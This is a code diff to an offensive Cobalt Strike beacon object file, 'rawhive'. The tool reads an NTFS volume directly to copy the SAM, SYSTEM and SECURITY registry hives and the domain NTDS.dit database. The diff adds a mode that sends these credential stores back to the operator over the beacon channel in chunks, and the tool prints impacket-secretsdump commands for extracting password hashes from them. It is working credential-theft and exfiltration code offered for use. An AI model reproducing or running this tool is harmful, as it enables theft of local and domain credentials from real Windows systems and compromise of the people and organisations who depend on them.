@@ -13,9 +13,16 @@ DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LP
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetComputerNameA(LPSTR,LPDWORD);
 DECLSPEC_IMPORT VOID   WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
 DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetFileAttributesA(LPCSTR);
-DECLSPEC_IMPORT void   WINAPI MSVCRT$memset(void* dest, int c, size_t count);
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
+DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE,DWORD,PHANDLE);
+DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE,DWORD,LPVOID,DWORD,PDWORD);
+DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
+DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);
 
+#define memset MSVCRT$memset
+#define memcpy MSVCRT$memcpy
 #define rh_zero(p,n)   MSVCRT$memset((p), 0, (n))
+#define rh_copy(d,s,n) MSVCRT$memcpy((d), (s), (n))
 
 static BOOL rh_range_ok(UINT32 off, UINT32 len, UINT32 size) {
     return off <= size && len <= size - off;
@@ -464,6 +471,149 @@ static UINT32 find_in_mft(CTX *c, UINT32 parent, const WCHAR *name, int nlen) {
     return result;
 }
 
+#define CALLBACK_FILE       0x02
+#define CALLBACK_FILE_WRITE 0x08
+#define CALLBACK_FILE_CLOSE 0x09
+#define RH_DL_CHUNK         (512 * 1024)
+
+static void rh_pack_be32(BYTE *p, UINT32 v) {
+    p[0] = (BYTE)(v >> 24);
+    p[1] = (BYTE)(v >> 16);
+    p[2] = (BYTE)(v >>  8);
+    p[3] = (BYTE)(v);
+}
+
+static BOOL rh_chunked_download(const char *fname, const BYTE *buf, UINT32 total_len) {
+    FILETIME ft;
+    KERNEL32$GetSystemTimeAsFileTime(&ft);
+    UINT32 fid = ft.dwLowDateTime;
+
+    int nlen = 0;
+    while (fname[nlen]) nlen++;
+
+    int start_sz = 4 + 4 + nlen;
+    BYTE *start_buf = (BYTE *)KERNEL32$VirtualAlloc(NULL, start_sz,
+        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!start_buf) return FALSE;
+    rh_pack_be32(start_buf, fid);
+    rh_pack_be32(start_buf + 4, total_len);
+    rh_copy(start_buf + 8, fname, nlen);
+    BeaconOutput(CALLBACK_FILE, (char *)start_buf, start_sz);
+    KERNEL32$VirtualFree(start_buf, 0, MEM_RELEASE);
+
+    DWORD chunk_alloc = 4 + RH_DL_CHUNK;
+    BYTE *chunk_buf = (BYTE *)KERNEL32$VirtualAlloc(NULL, chunk_alloc,
+        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!chunk_buf) return FALSE;
+    rh_pack_be32(chunk_buf, fid);
+
+    UINT32 offset = 0;
+    while (offset < total_len) {
+        DWORD chunk_sz = RH_DL_CHUNK;
+        if (offset + chunk_sz > total_len) chunk_sz = total_len - offset;
+        rh_copy(chunk_buf + 4, buf + offset, chunk_sz);
+        BeaconOutput(CALLBACK_FILE_WRITE, (char *)chunk_buf, 4 + chunk_sz);
+        offset += chunk_sz;
+    }
+
+    KERNEL32$VirtualFree(chunk_buf, 0, MEM_RELEASE);
+
+    BYTE close_buf[4];
+    rh_pack_be32(close_buf, fid);
+    BeaconOutput(CALLBACK_FILE_CLOSE, (char *)close_buf, 4);
+    return TRUE;
+}
+
+static BOOL extract_to_download(CTX *c, UINT32 num, const char *label,
+                                 const char *hostname, const char *ts) {
+    BYTE *rec = KERNEL32$VirtualAlloc(NULL, c->rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!rec) return FALSE;
+
+    BOOL ok = FALSE;
+    if (!read_mft_entry(c, num, rec)) goto dl_done;
+    { MFT_REC *m = (MFT_REC *)rec; if (m->magic != MFT_MAGIC) goto dl_done; }
+
+    ATTR_HDR *da = find_attr(rec, c->rec_sz, AT_DATA);
+    if (!da) goto dl_done;
+
+    char fname[260];
+    {
+        UINT32 i = 0;
+        fname[0] = '\0';
+        if (!rh_append_str(fname, sizeof(fname), &i, hostname, FALSE) ||
+            !rh_append_char(fname, sizeof(fname), &i, '_') ||
+            !rh_append_str(fname, sizeof(fname), &i, ts, FALSE) ||
+            !rh_append_char(fname, sizeof(fname), &i, '_') ||
+            !rh_append_str(fname, sizeof(fname), &i, label, TRUE) ||
+            !rh_append_str(fname, sizeof(fname), &i, ".tmp", FALSE)) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] filename too long");
+            goto dl_done;
+        }
+    }
+
+    if (!da->non_res) {
+        const BYTE *val;
+        UINT32 val_len;
+        if (attr_res_value(da, &val, &val_len)) {
+            ok = BeaconDownload(fname, (const char *)val, val_len);
+            if (ok)
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s (%u bytes)", label, val_len);
+        }
+    } else {
+        const BYTE *runs;
+        const BYTE *runs_end;
+        if (!attr_nr_runs(da, &runs, &runs_end)) goto dl_done;
+
+        ATTR_NR *nr = (ATTR_NR *)da;
+        UINT64   dsz = nr->data_sz;
+
+        BYTE *buf = KERNEL32$VirtualAlloc(NULL, (SIZE_T)dsz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if (!buf) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] %s alloc failed (%llu bytes)", label, dsz);
+            goto dl_done;
+        }
+
+        INT64  lcns[MAX_RUNS]; UINT64 cnts[MAX_RUNS];
+        int nruns = decode_runs(runs, runs_end, lcns, cnts, MAX_RUNS);
+
+        UINT64 filled = 0;
+        ok = nruns >= 0;
+
+        for (int i = 0; i < nruns && filled < dsz && ok; i++) {
+            for (UINT64 k = 0; k < cnts[i] && filled < dsz && ok; k++) {
+                DWORD to_rw = c->bpc;
+                if (filled + to_rw > dsz) to_rw = (DWORD)(dsz - filled);
+                if (lcns[i] < 0) {
+                    rh_zero(buf + filled, to_rw);
+                } else {
+                    UINT64 offset = (UINT64)(lcns[i] + (INT64)k) * c->bpc;
+                    if (!vol_read(c, offset, buf + filled, to_rw)) {
+                        ok = FALSE; break;
+                    }
+                }
+                filled += to_rw;
+            }
+        }
+
+        if (ok && filled == dsz) {
+            ok = rh_chunked_download(fname, buf, (UINT32)dsz);
+            if (ok)
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s (%llu bytes)", label, dsz);
+            else
+                BeaconPrintf(CALLBACK_ERROR, "[-] %s download failed", label);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[-] %s read failed at byte %llu", label, filled);
+            ok = FALSE;
+        }
+
+        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
+    }
+
+dl_done:
+    KERNEL32$VirtualFree(rec, 0, MEM_RELEASE);
+    return ok;
+}
+
 static BOOL extract_to_file(CTX *c, UINT32 num, const char *label,
                              const char *outdir, const char *hostname, const char *ts) {
     BYTE *rec = KERNEL32$VirtualAlloc(NULL, c->rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -488,7 +638,7 @@ static BOOL extract_to_file(CTX *c, UINT32 num, const char *label,
             !rh_append_char(outpath, sizeof(outpath), &i, '_') ||
             !rh_append_str(outpath, sizeof(outpath), &i, label, TRUE) ||
             !rh_append_str(outpath, sizeof(outpath), &i, ".tmp", FALSE)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] output path too long\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] output path too long");
             goto done;
         }
     }
@@ -496,7 +646,7 @@ static BOOL extract_to_file(CTX *c, UINT32 num, const char *label,
     HANDLE fout = KERNEL32$CreateFileA(outpath, GENERIC_WRITE, 0, NULL,
                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (fout == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] open(%s) failed: %lu\n", outpath, KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[-] open(%s) failed: %lu", outpath, KERNEL32$GetLastError());
         goto done;
     }
 
@@ -546,9 +696,9 @@ static BOOL extract_to_file(CTX *c, UINT32 num, const char *label,
         if (ok && filled != dsz) ok = FALSE;
 
         if (ok)
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s -> %s (%llu bytes)\n", label, outpath, filled);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s -> %s (%llu bytes)", label, outpath, filled);
         else
-            BeaconPrintf(CALLBACK_ERROR, "[-] %s failed at byte %llu (err %lu)\n",
+            BeaconPrintf(CALLBACK_ERROR, "[-] %s failed at byte %llu (err %lu)",
                          label, filled, KERNEL32$GetLastError());
 
         KERNEL32$VirtualFree(cbuf, 0, MEM_RELEASE);
@@ -565,15 +715,23 @@ void go(char *args, int alen) {
     BeaconDataParse(&parser, args, alen);
     char *a_vol = BeaconDataExtract(&parser, NULL);
     char *a_out = BeaconDataExtract(&parser, NULL);
+    int   a_dl  = BeaconDataInt(&parser);
 
-    if (!a_out || !a_out[0]) {
-        a_out = a_vol;
-        a_vol = "C";
-    }
+    BOOL download_mode = (a_dl == 1);
 
-    if (!a_out || !a_out[0]) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] usage: rawhive [volume] <outdir>\n");
-        return;
+    if (!download_mode) {
+        if (!a_out || !a_out[0]) {
+            a_out = a_vol;
+            a_vol = "C";
+        }
+
+        if (!a_out || !a_out[0]) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] usage: rawhive <outdir> [volume]");
+            return;
+        }
+    } else {
+        if (!a_vol || !a_vol[0]) a_vol = "C";
+        a_out = NULL;
     }
 
     char vol = 'C';
@@ -581,15 +739,15 @@ void go(char *args, int alen) {
         vol = a_vol[0];
         if (vol >= 'a' && vol <= 'z') vol -= 32;
         if (vol < 'A' || vol > 'Z' || (a_vol[1] && !(a_vol[1] == ':' && !a_vol[2]))) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] invalid volume: %s\n", a_vol);
+            BeaconPrintf(CALLBACK_ERROR, "[-] invalid volume: %s", a_vol);
             return;
         }
     }
 
-    {
+    if (!download_mode) {
         DWORD attr = KERNEL32$GetFileAttributesA(a_out);
         if (attr == 0xFFFFFFFF || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] outdir does not exist: %s\n", a_out);
+            BeaconPrintf(CALLBACK_ERROR, "[-] outdir does not exist: %s", a_out);
             return;
         }
     }
@@ -608,23 +766,48 @@ void go(char *args, int alen) {
 
     char vol_path[] = "\\\\.\\C:";
     vol_path[4] = vol;
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] rawhive: host=%s ts=%s volume=%c: out=%s\n", hostname, ts, vol, a_out);
+    if (download_mode)
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] rawhive: host=%s ts=%s volume=%c: mode=download", hostname, ts, vol);
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] rawhive: host=%s ts=%s volume=%c: out=%s", hostname, ts, vol, a_out);
+
+    /* elevation preflight: raw volume reads are admin-only; fail with a
+       clear message instead of a bare error-5 from CreateFileA */
+    {
+        HANDLE tok = NULL;
+        DWORD elev = 0, ret = 0;
+        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tok)) {
+            BOOL not_elev = ADVAPI32$GetTokenInformation(tok, TokenElevation,
+                                                         &elev, sizeof(elev), &ret) && !elev;
+            KERNEL32$CloseHandle(tok);
+            if (not_elev) {
+                BeaconPrintf(CALLBACK_ERROR,
+                    "[-] not elevated - run it from an elevated beacon\n",
+                    vol);
+                return;
+            }
+        }
+    }
 
     CTX c; rh_zero(&c, sizeof(c));
     c.vol = KERNEL32$CreateFileA(vol_path, GENERIC_READ,
                 FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (c.vol == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] open %s failed: %lu\n", vol_path, KERNEL32$GetLastError());
+        DWORD oe = KERNEL32$GetLastError();
+        if (oe == 5) /* ERROR_ACCESS_DENIED */
+            BeaconPrintf(CALLBACK_ERROR, "[-] open %s failed: %lu (Access Denied) - run it from an elevated beacon", vol_path, oe);
+        else
+            BeaconPrintf(CALLBACK_ERROR, "[-] open %s failed: %lu", vol_path, oe);
         return;
     }
 
     BYTE boot[512]; rh_zero(boot, 512);
     if (!vol_read(&c, 0, boot, 512)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] boot read failed\n"); goto shut;
+        BeaconPrintf(CALLBACK_ERROR, "[-] boot read failed"); goto shut;
     }
     if (boot[3]!='N'||boot[4]!='T'||boot[5]!='F'||boot[6]!='S') {
-        BeaconPrintf(CALLBACK_ERROR, "[-] not NTFS\n"); goto shut;
+        BeaconPrintf(CALLBACK_ERROR, "[-] not NTFS"); goto shut;
     }
 
     {
@@ -637,40 +820,37 @@ void go(char *args, int alen) {
         if (!c.idx_sz) c.idx_sz = 4096;
         if (!b->spc || !c.bpc || c.bps < 512 || c.bps > 4096 ||
                 c.rec_sz < sizeof(MFT_REC) || c.idx_sz < sizeof(INDX_HDR)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] unsupported NTFS geometry\n"); goto shut;
+            BeaconPrintf(CALLBACK_ERROR, "[-] unsupported NTFS geometry"); goto shut;
         }
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] ntfs: bpc=%u rec=%u mft_lcn=%llu\n",
-                     c.bpc, c.rec_sz, b->mft_lcn);
-
         BYTE *mft0 = KERNEL32$VirtualAlloc(NULL, c.rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-        if (!mft0) { BeaconPrintf(CALLBACK_ERROR, "[-] alloc\n"); goto shut; }
+        if (!mft0) { BeaconPrintf(CALLBACK_ERROR, "[-] alloc"); goto shut; }
 
         if (!vol_read(&c, b->mft_lcn * c.bpc, mft0, c.rec_sz)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] mft[0] read\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] mft[0] read");
             KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
         }
         apply_fixup(mft0, c.rec_sz, c.bps);
 
         if (((MFT_REC *)mft0)->magic != MFT_MAGIC) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] mft[0] bad magic\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] mft[0] bad magic");
             KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
         }
 
         ATTR_HDR *mfdata = find_attr(mft0, c.rec_sz, AT_DATA);
         if (!mfdata || !mfdata->non_res) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] $mft $data missing\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] $mft $data missing");
             KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
         }
         const BYTE *runs;
         const BYTE *runs_end;
         if (!attr_nr_runs(mfdata, &runs, &runs_end)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] $mft runlist malformed\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] $mft runlist malformed");
             KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
         }
         c.mft_nruns = decode_runs(runs, runs_end, c.mft_lcn, c.mft_cnt, MAX_RUNS);
         if (c.mft_nruns <= 0) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] $mft runlist malformed\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] $mft runlist malformed");
             KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
         }
         KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE);
@@ -682,15 +862,15 @@ void go(char *args, int alen) {
 
     UINT32 r_win = find_in_dir(&c, 5, wWindows, 7);
     if (!r_win) r_win = find_in_mft(&c, 5, wWindows, 7);
-    if (!r_win) { BeaconPrintf(CALLBACK_ERROR, "[-] Windows/ not found\n"); goto shut; }
+    if (!r_win) { BeaconPrintf(CALLBACK_ERROR, "[-] Windows/ not found"); goto shut; }
 
     UINT32 r_s32 = find_in_dir(&c, r_win, wSystem32, 8);
     if (!r_s32) r_s32 = find_in_mft(&c, r_win, wSystem32, 8);
-    if (!r_s32) { BeaconPrintf(CALLBACK_ERROR, "[-] System32/ not found\n"); goto shut; }
+    if (!r_s32) { BeaconPrintf(CALLBACK_ERROR, "[-] System32/ not found"); goto shut; }
 
     UINT32 r_cfg = find_in_dir(&c, r_s32, wConfig, 6);
     if (!r_cfg) r_cfg = find_in_mft(&c, r_s32, wConfig, 6);
-    if (!r_cfg) { BeaconPrintf(CALLBACK_ERROR, "[-] config/ not found\n"); goto shut; }
+    if (!r_cfg) { BeaconPrintf(CALLBACK_ERROR, "[-] config/ not found"); goto shut; }
 
     {
         static const WCHAR wSAM[]      = {'S','A','M',0};
@@ -705,9 +885,12 @@ void go(char *args, int alen) {
         for (int t = 0; t < 3; t++) {
             UINT32 r = find_in_dir(&c, r_cfg, tgts[t].name, tgts[t].nlen);
             if (!r) r = find_in_mft(&c, r_cfg, tgts[t].name, tgts[t].nlen);
-            if (!r) { BeaconPrintf(CALLBACK_OUTPUT, "[!] %s not found\n", tgts[t].label); continue; }
-            if (!extract_to_file(&c, r, tgts[t].label, a_out, hostname, ts))
-                BeaconPrintf(CALLBACK_ERROR, "[-] %s failed\n", tgts[t].label);
+            if (!r) { BeaconPrintf(CALLBACK_OUTPUT, "[!] %s not found", tgts[t].label); continue; }
+            BOOL eok = download_mode
+                ? extract_to_download(&c, r, tgts[t].label, hostname, ts)
+                : extract_to_file(&c, r, tgts[t].label, a_out, hostname, ts);
+            if (!eok)
+                BeaconPrintf(CALLBACK_ERROR, "[-] %s failed", tgts[t].label);
         }
     }
 
@@ -722,32 +905,34 @@ void go(char *args, int alen) {
             UINT32 r_dit = find_in_dir(&c, r_ntdsdir, wNtdsDit, 8);
             if (!r_dit) r_dit = find_in_mft(&c, r_ntdsdir, wNtdsDit, 8);
             if (r_dit)
-                got_ntds = extract_to_file(&c, r_dit, "ntds", a_out, hostname, ts);
+                got_ntds = download_mode
+                    ? extract_to_download(&c, r_dit, "ntds", hostname, ts)
+                    : extract_to_file(&c, r_dit, "ntds", a_out, hostname, ts);
         }
     }
 
     if (got_ntds)
         BeaconPrintf(CALLBACK_OUTPUT,
             "[*] done\n"
-            "impacket-secretsdump"
+            "    impacket-secretsdump"
             " -sam %s_%s_sam.tmp"
             " -system %s_%s_system.tmp"
             " -security %s_%s_security.tmp"
             " LOCAL\n"
-            "impacket-secretsdump"
+            "    impacket-secretsdump"
             " -ntds %s_%s_ntds.tmp"
             " -system %s_%s_system.tmp"
-            " LOCAL\n",
+            " LOCAL",
             hostname, ts, hostname, ts, hostname, ts,
             hostname, ts, hostname, ts);
     else
         BeaconPrintf(CALLBACK_OUTPUT,
             "[*] done\n"
-            "impacket-secretsdump"
+            "    impacket-secretsdump"
             " -sam %s_%s_sam.tmp"
             " -system %s_%s_system.tmp"
             " -security %s_%s_security.tmp"
-            " LOCAL\n",
+            " LOCAL",
             hostname, ts, hostname, ts, hostname, ts);
 shut:
     KERNEL32$CloseHandle(c.vol);
